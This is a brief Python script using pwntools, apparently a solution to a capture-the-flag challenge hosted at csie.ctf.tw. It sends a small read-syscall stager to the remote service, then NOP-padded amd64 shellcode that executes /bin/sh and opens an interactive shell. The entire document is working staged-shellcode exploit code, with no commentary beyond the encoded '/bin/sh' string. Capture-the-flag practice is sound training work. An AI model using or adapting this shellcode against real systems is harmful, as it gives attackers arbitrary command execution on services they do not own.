from pwn import *

context.arch = 'amd64'
#/bin/sh
#2F 62 69 6E 2F 73 68 00
a = asm("""
        mov rdx, rdi
        xor rdi, rdi
        syscall
	""")
r = remote("csie.ctf.tw",10122)
r.send(a)
a = asm("""
        mov rdi, 0x0068732F6E69622F
	push rdi
        mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
        mov rax, 0x3b
	syscall
	""")
a = 9*b'\x90'+a
r.send(a)
r.interactive()
